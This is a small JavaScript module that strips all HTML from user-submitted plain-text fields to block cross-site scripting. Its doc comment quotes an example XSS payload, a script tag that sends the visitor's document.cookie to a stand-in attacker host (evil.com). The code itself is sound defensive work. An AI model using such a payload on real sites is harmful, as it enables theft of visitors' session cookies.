const sanitizeHtml = require("sanitize-html");

/**
 * Strips all HTML tags and scripts from user-submitted text before it's
 * saved to the database. Product descriptions, category descriptions, and
 * inquiry messages are all plain text fields in this app (no rich text
 * editor), so the safest approach is to disallow ALL tags rather than try
 * to allow a "safe" subset — this closes off XSS (cross-site scripting)
 * attacks where someone submits something like:
 *   <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
 * as a product description, hoping it runs in another visitor's browser.
 */
function sanitizePlainText(input) {
  if (typeof input !== "string") return input;
  return sanitizeHtml(input, {
    allowedTags: [],
    allowedAttributes: {},
  }).trim();
}

module.exports = { sanitizePlainText };
